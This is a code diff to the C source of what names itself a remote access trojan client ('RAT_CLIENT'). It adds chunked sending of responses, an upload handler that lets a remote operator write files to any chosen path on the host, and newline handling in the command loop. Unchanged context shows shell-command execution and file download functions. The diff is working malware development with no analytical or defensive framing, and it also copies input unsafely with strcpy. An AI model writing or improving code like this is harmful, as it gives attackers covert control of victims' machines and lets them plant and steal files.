@@ -146,7 +146,26 @@ void send_response_with_prompt(RAT_CLIENT *client, const char *response) {
         snprintf(full_response, sizeof(full_response), "%s", prompt);
     }
     
-    send(client->client_fd, full_response, strlen(full_response), 0);
+    // Send in chunks if response is large
+    int total_len = strlen(full_response);
+    int sent = 0;
+    int chunk_size = BUFFER_SIZE - 1;
+    
+    while (sent < total_len) {
+        int to_send = (total_len - sent > chunk_size) ? chunk_size : (total_len - sent);
+        int bytes_sent = send(client->client_fd, full_response + sent, to_send, 0);
+        
+        if (bytes_sent <= 0) {
+            break; // Error sending
+        }
+        
+        sent += bytes_sent;
+        
+        // Small delay between chunks to prevent overwhelming
+        if (sent < total_len) {
+            usleep(10000); // 10ms delay
+        }
+    }
 }
 
 void execute_shell_command(RAT_CLIENT *client, const char *command) {
@@ -220,20 +239,81 @@ void handle_download(RAT_CLIENT *client, const char *filename) {
 
 void handle_upload(RAT_CLIENT *client) {
     FILE *file;
-    char filename[256];
+    char upload_info[512];
+    char destination[256] = {0};
+    char filename[256] = {0};
+    char final_path[512];
     char buffer[BUFFER_SIZE];
     int bytes_received;
+    char *delimiter;
     
-    // Receive filename
-    memset(filename, 0, sizeof(filename));
-    bytes_received = recv(client->client_fd, filename, sizeof(filename) - 1, 0);
-    if (bytes_received <= 0) {
-        return;
+    // Receive upload info in format "destination|filename\n"
+    memset(upload_info, 0, sizeof(upload_info));
+    int info_pos = 0;
+    char temp_char;
+    
+    // Read upload info character by character until newline
+    while (info_pos < sizeof(upload_info) - 1) {
+        bytes_received = recv(client->client_fd, &temp_char, 1, 0);
+        if (bytes_received <= 0) {
+            return;
+        }
+        
+        if (temp_char == '\n') {
+            break; // End of upload info
+        }
+        
+        upload_info[info_pos++] = temp_char;
     }
-    filename[bytes_received] = '\0';
+    upload_info[info_pos] = '\0';
     
-    file = fopen(filename, "wb");
+    // Send acknowledgment to server
+    send(client->client_fd, "OK", 2, 0);
+    
+    // Parse destination and filename
+    delimiter = strchr(upload_info, '|');
+    if (delimiter) {
+        *delimiter = '\0';
+        strcpy(destination, upload_info);
+        strcpy(filename, delimiter + 1);
+    } else {
+        // Fallback to old format - treat entire string as filename
+        strcpy(filename, upload_info);
+    }
+    
+    // Determine final file path
+    if (strlen(destination) > 0) {
+        // Check if destination is a directory
+        struct stat st;
+        if (stat(destination, &st) == 0 && S_ISDIR(st.st_mode)) {
+            // Destination is a directory, append filename
+            const char *base_filename = strrchr(filename, '/');
+            if (base_filename) {
+                base_filename++; // Skip the '/'
+            } else {
+                base_filename = filename;
+            }
+            snprintf(final_path, sizeof(final_path), "%s/%s", destination, base_filename);
+        } else {
+            // Destination is a full file path
+            strcpy(final_path, destination);
+        }
+    } else {
+        // No destination specified, use current directory
+        const char *base_filename = strrchr(filename, '/');
+        if (base_filename) {
+            base_filename++; // Skip the '/'
+        } else {
+            base_filename = filename;
+        }
+        strcpy(final_path, base_filename);
+    }
+    
+    file = fopen(final_path, "wb");
     if (file == NULL) {
+        char error_msg[256];
+        snprintf(error_msg, sizeof(error_msg), "Error: Cannot create file %s", final_path);
+        send_response_with_prompt(client, error_msg);
         return;
     }
     
@@ -271,6 +351,11 @@ void execute_commands(RAT_CLIENT *client) {
         
         command[bytes_received] = '\0';
         
+        // Remove trailing newline if present
+        if (command[strlen(command) - 1] == '\n') {
+            command[strlen(command) - 1] = '\0';
+        }
+        
         // Parse command
         arg_count = 0;
         char command_copy[MAX_COMMAND_SIZE];
@@ -301,8 +386,10 @@ void execute_commands(RAT_CLIENT *client) {
         }
         else if (strcmp(args[0], "upload") == 0) {
             handle_upload(client);
-            // Send confirmation prompt after upload
-            send_response_with_prompt(client, "File upload completed");
+            // Send confirmation prompt after upload with file path info
+            char upload_msg[256];
+            snprintf(upload_msg, sizeof(upload_msg), "File uploaded successfully");
+            send_response_with_prompt(client, upload_msg);
         }
         else if (strcmp(args[0], "exit") == 0) {
             send_response(client, "Goodbye!");
